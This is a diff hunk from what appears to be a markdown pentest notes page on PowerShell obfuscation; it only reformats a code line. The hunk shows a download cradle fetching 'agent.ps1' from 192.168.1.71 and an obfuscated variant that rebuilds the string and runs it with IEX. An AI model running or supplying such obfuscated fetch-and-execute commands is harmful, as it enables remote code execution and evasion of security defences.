@@ -361,7 +361,8 @@ The above string can be obfuscated using **powershell special characters:** **`*
 `(New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
 
 - String obfuscated<br />
-`$cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX`
+
+      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
 
 ![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)
 
